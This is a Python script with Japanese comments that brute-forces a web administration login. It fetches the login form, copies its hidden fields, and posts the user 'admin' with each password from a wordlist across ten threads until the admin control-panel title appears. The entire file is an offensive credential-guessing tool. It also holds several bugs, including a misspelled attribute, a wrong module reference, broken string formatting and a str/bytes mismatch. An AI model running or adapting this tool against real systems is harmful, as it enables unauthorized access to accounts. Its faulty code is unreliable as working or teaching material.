# インポート定義
import urllib.request
import urllib.parse
import http.cookiejar
import threading
import sys
import queue

from html.parser import HTMLParser

# 共通の設定
user_thread = 10
user_name = "admin"
wordlist_file = "/tmp/cain.txt"
resume = None

# ターゲットに合わせた設定
target_url = "http://192.168.99.38/"
target_post = "http://192.168.99.38/"


username_field = "username"
password_field = "passwd"

success_check = "Administration - Control Panel"

# 単語辞書用定義
wordlist_file = "/tmp/all.txt"


class Bruter(object):
    def __init__(self,username,words):
        self.usernamne = username
        self.password_q = words
        self.found = False

        print("Finished setting up for: %s" % username)

    def run_bruteforce(self):

        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):

        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = http.cookiejar.FileCookieJar("cookies")

            opener = urllib.request.build_opener(urllib.HTTPCookieProcessor(jar))

            response = opener.open(target_url)

            page = response.read()

            print("Trying: %s : %s (%d left)" % self.usernamne,brute,self.password_q.qsize())

            # hiddenフィールドをパース
            parser = BruteParser()
            parser.feed(page)

            post_tags = parser.tag_results

            # usernameフィールドとpasswordフィールドを追加
            post_tags[username_field] = self.usernamne
            post_tags[password_field] = brute

            login_data = urllib.parse.urlencode(post_tags)
            login_response = opener.open(target_post, login_data)

            login_result = login_response.read()

            if success_check in login_result:
                self.found = True

                print("[*] Bruteforce successful.")
                print("[*] Username: %s" % self.username)
                print("[*] Password: %s" % brute)
                print("[*] Waiting for other thread to exit...")


class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name,value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value

            if tag_name is not None:
                self.tag_results[tag_name] = value

    def handle_endtag(self, tag):
        pass

    def handle_data(self, data):
        pass

    def handle_comment(self, data):
        pass


# 単語ファイルを読み込む
def build_wordlist(wordlist_file):

    # 単語の辞書を読み取る
    fd = open(wordlist_file, "rb")
    raw_word = fd.readlines()
    fd.close()

    found_resume = False
    words = queue.Queue()

    for word in raw_word:

        word = word.rstrip()

        if resume is not None:

            if found_resume:
                words.put(word)
            else:
                found_resume = True
                print("Resuming wordlist from: %s" % resume)

        else:
            words.put(word)

    return words


# メイン処理関数
def main():

    words = build_wordlist(wordlist_file)

    bruter_obj = Bruter(user_name, words)
    bruter_obj.run_bruteforce()


# プログラムのエントリポイント
if __name__ == "__main__":
    # execute only if run as a script
    main()